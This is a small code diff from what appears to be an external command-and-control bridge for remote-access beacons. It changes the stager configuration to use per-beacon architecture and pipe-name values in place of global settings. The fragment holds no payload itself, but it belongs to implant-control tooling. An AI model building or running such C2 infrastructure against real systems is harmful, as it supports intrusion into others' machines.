@@ -35,7 +35,7 @@ def requestStager(sock):
 
 def loadStager(beacon_obj):
     # Send options to the external_c2 server
-    configureOptions(beacon_obj.sock, config.C2_ARCH, config.C2_PIPE_NAME, beacon_obj.block_time)
+    configureOptions(beacon_obj.sock, beacon_obj.beacon_arch, beacon_obj.pipe_name, beacon_obj.block_time)
 
     if config.debug:
         print commonUtils.color("stager configured, sending 'go'", status=False, yellow=True)
